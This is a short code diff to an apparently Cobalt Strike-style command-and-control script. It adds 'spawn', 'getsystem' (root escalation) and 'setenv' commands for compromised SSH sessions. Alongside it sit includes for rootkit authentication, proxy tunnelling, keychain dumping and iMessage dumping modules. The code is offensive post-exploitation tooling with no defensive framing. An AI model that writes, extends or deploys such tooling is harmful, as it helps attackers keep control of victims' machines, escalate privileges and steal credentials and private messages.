@@ -1,5 +1,6 @@
 
 include(script_resource("jobs/cc2_jobs.cna"));
+include(script_resource("script/runScript.cna"));
 include(script_resource("proxy/frp/cc2_frp.cna"));
 include(script_resource("rootkit/auth/cc2_ssh.cna"));
 include(script_resource("rootkit/auth/cc2_auth.cna"));
@@ -13,6 +14,25 @@ include(script_resource("gather/keychain/keychain_dump.cna"));
 include(script_resource("gather/message/iMessage_dump.cna"));
 
 
+ssh_alias spawn {
+    bshell($1, "spawn");
+}
+
+ssh_alias getsystem {
+    bshell($1, "getsystem");
+}
+
+ssh_alias setenv {
+    if($2 && $3){
+        bshell($1, "setenv $2 $3");
+    } else {
+        berror($1, "*[error]: setenv env_name env_value");
+    }
+}
+
+ssh_command_register("spawn", "Spawn a new session");
+ssh_command_register("getsystem", "Promote the session with uid=0 temporary permission to root session");
+ssh_command_register("setenv", "Set the environment variables of the session", "\nUsage: setenv <EnvName> <EnvValue> \n\tsetenv PATH ./:/usr/bin/\n");
 
 # Useful aliases, placed in kitloader because I always have this loaded
 # from 'Und3rf10w - KitLoader.cna'
